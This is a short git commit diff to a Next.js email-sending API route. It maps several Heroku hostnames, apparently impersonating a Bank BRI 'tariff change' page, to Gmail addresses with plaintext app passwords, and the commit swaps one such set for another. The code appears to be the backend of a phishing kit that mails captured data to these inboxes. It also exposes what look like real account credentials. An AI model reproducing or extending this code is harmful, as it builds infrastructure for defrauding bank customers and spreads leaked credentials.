8adb1f1625470313d8205c229cbfdb46e80a1b1b
penaruhangin <penaruhangin@gmail.com>
2022-10-06 01:54:25 +0700

    tambah email

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -13,9 +13,9 @@ export default function handler(req, res) {
         pass = 'ahghpmbdwokimqim'; 
 
 
-    } else if(url == 'tarif-bri.herokuapp.com'){
-        email = 'pooopss117@gmail.com';
-        pass = 'teelhhgttgviupfp';
+    } else if(url == 'per-ubahan-tarif.herokuapp.com'){
+        email = 'qqq66195@gmail.com';
+        pass = 'gsnyrcjtylrepjdg';
 
 
     } else if(url == 'ubah-tarif.herokuapp.com'){
